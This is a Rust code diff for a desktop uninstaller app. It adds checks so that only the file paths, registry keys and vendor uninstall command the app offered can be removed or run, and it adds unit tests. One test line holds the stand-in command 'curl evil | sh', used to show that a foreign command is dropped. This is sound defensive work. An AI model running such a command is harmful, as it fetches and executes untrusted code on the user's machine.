@@ -32,24 +32,61 @@ struct Cache {
     extensions: Mutex<Vec<ExtensionGroup>>,
     updates: Mutex<Vec<UpdateInfo>>,
     junk: Mutex<Vec<JunkGroup>>,
-    /// Every path the backend has offered up in a plan.
+    /// Everything the backend has offered up in a plan.
     ///
-    /// The interface can deselect items but never invent them, so a path
+    /// The interface can deselect items but never invent them, so anything
     /// arriving at `execute_plan` that was never offered did not come from a
     /// plan this app produced. The engine's blocklist would still refuse
     /// system and personal paths, but it would happily remove any ordinary
     /// file — so the plan is checked against what was actually offered rather
     /// than taken on trust.
-    offered: Mutex<HashSet<PathBuf>>,
+    offered: Mutex<Offered>,
+}
+
+/// What the last plan actually contained.
+#[derive(Default)]
+struct Offered {
+    paths: HashSet<PathBuf>,
+    /// Registry keys, kept separately because a key is not a file and is not
+    /// covered by checking the path: an item can carry a path that was offered
+    /// and a key that was not.
+    keys: HashSet<String>,
+    /// The vendor's own uninstaller.
+    ///
+    /// This one matters most. It is a command line, and it is run through a
+    /// shell — elevated, on Windows. A path arriving that was never offered
+    /// costs one wrong file; a command arriving that was never offered is
+    /// arbitrary code as administrator. It is checked the same way as the
+    /// rest, which until now it was not.
+    command: Option<String>,
+}
+
+/// Whether an item is one this app actually offered.
+///
+/// Both halves have to match. Checking the path alone would accept an item
+/// carrying a path from the plan and a registry key that was never in it —
+/// and the registry branch runs on the key, not the path.
+fn was_offered(item: &RemovalItem, paths: &HashSet<PathBuf>, keys: &HashSet<String>) -> bool {
+    paths.contains(&item.path)
+        && item
+            .registry_key
+            .as_ref()
+            .map(|k| keys.contains(k))
+            .unwrap_or(true)
 }
 
 impl Cache {
     /// Record what a plan put in front of the user.
     fn offer(&self, plan: &RemovalPlan) {
         let mut offered = self.offered.lock().unwrap();
-        offered.clear();
+        offered.paths.clear();
+        offered.keys.clear();
+        offered.command = plan.delegated_command.clone();
         for item in &plan.items {
-            offered.insert(item.path.clone());
+            offered.paths.insert(item.path.clone());
+            if let Some(key) = &item.registry_key {
+                offered.keys.insert(key.clone());
+            }
         }
     }
 }
@@ -142,12 +179,23 @@ fn plan_orphans(names: Vec<String>, cache: State<Cache>) -> RemovalPlan {
 /// Carry out a plan. Everything goes to the Trash.
 #[tauri::command]
 fn execute_plan(plan: RemovalPlan, force: bool, cache: State<Cache>) -> RemovalReport {
-    // Nothing is removed that this app did not itself put in front of the user.
-    let offered = cache.offered.lock().unwrap().clone();
+    // Nothing is removed, and nothing is run, that this app did not itself put
+    // in front of the user.
     let mut plan = plan;
+    let (paths, keys, command) = {
+        let o = cache.offered.lock().unwrap();
+        (o.paths.clone(), o.keys.clone(), o.command.clone())
+    };
+
+    // A command line is the most dangerous thing a plan can carry, so it is
+    // dropped outright unless it is the one that was offered.
+    if plan.delegated_command.is_some() && plan.delegated_command != command {
+        plan.delegated_command = None;
+    }
+
     let mut refused: Vec<RemovalOutcome> = Vec::new();
     plan.items.retain(|item| {
-        if !item.selected || offered.contains(&item.path) {
+        if !item.selected || was_offered(item, &paths, &keys) {
             return true;
         }
         refused.push(RemovalOutcome {
@@ -228,6 +276,10 @@ fn plan_extensions(ids: Vec<String>, cache: State<Cache>) -> RemovalPlan {
     for item in plan.items.iter_mut() {
         item.selected = true;
     }
+    // Without this the execute step compares against whatever the *previous*
+    // plan offered and refuses every one of these — which is what it has been
+    // doing. A guard that silently turns a feature off is still a bug.
+    cache.offer(&plan);
     plan
 }
 
@@ -413,9 +465,9 @@ fn download_app_update(release: Release) -> Result<String, String> {
 #[tauri::command]
 fn install_update(app: tauri::AppHandle, path: String) -> Result<(), String> {
     let path = PathBuf::from(&path);
-    let expected_parent =
-        std::env::temp_dir().join(format!("BHUninstaller-update-{}", std::process::id()));
-    if path.parent() != Some(expected_parent.as_path()) {
+    // Exactly the file this process downloaded, not merely something in the
+    // directory it downloaded into.
+    if bhu_core::selfupdate::last_download().as_deref() != Some(path.as_path()) {
         return Err("that file was not downloaded by this app — refusing to run it".into());
     }
     let ext = path
@@ -569,4 +621,89 @@ pub fn run() {
         ])
         .run(tauri::generate_context!())
         .expect("error while running BHUninstaller");
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    use bhu_core::model::{Confidence, LeftoverKind};
+
+    fn item(path: &str, key: Option<&str>) -> RemovalItem {
+        RemovalItem {
+            path: PathBuf::from(path),
+            name: "x".into(),
+            size_bytes: 0,
+            size_unknown: false,
+            is_directory: false,
+            kind: LeftoverKind::Other,
+            confidence: Confidence::High,
+            reason: String::new(),
+            requires_admin: false,
+            selected: true,
+            registry_key: key.map(str::to_string),
+        }
+    }
+
+    fn offered_for(plan: &RemovalPlan) -> Offered {
+        let cache = Cache::default();
+        cache.offer(plan);
+        let o = cache.offered.lock().unwrap();
+        Offered {
+            paths: o.paths.clone(),
+            keys: o.keys.clone(),
+            command: o.command.clone(),
+        }
+    }
+
+    #[test]
+    fn an_item_that_was_never_offered_is_refused() {
+        let plan = RemovalPlan {
+            app: None,
+            items: vec![item("/tmp/a", None)],
+            delegated_command: None,
+        };
+        let o = offered_for(&plan);
+        assert!(was_offered(&item("/tmp/a", None), &o.paths, &o.keys));
+        assert!(!was_offered(&item("/tmp/b", None), &o.paths, &o.keys));
+    }
+
+    #[test]
+    fn a_registry_key_cannot_ride_in_on_an_offered_path() {
+        // The path was offered; the key attached to it was not.
+        let plan = RemovalPlan {
+            app: None,
+            items: vec![item(
+                "HKCU\\Software\\Vendor",
+                Some("HKCU\\Software\\Vendor"),
+            )],
+            delegated_command: None,
+        };
+        let o = offered_for(&plan);
+        assert!(was_offered(
+            &item("HKCU\\Software\\Vendor", Some("HKCU\\Software\\Vendor")),
+            &o.paths,
+            &o.keys
+        ));
+        assert!(!was_offered(
+            &item(
+                "HKCU\\Software\\Vendor",
+                Some("HKCU\\Software\\SomeoneElse")
+            ),
+            &o.paths,
+            &o.keys
+        ));
+    }
+
+    #[test]
+    fn only_the_offered_uninstall_command_survives() {
+        let plan = RemovalPlan {
+            app: None,
+            items: vec![],
+            delegated_command: Some("\"C:\\Foo\\unins000.exe\" /S".into()),
+        };
+        let o = offered_for(&plan);
+        assert_eq!(o.command.as_deref(), Some("\"C:\\Foo\\unins000.exe\" /S"));
+        // Anything else the interface might send is not this, so it is dropped.
+        assert_ne!(o.command.as_deref(), Some("curl evil | sh"));
+    }
 }
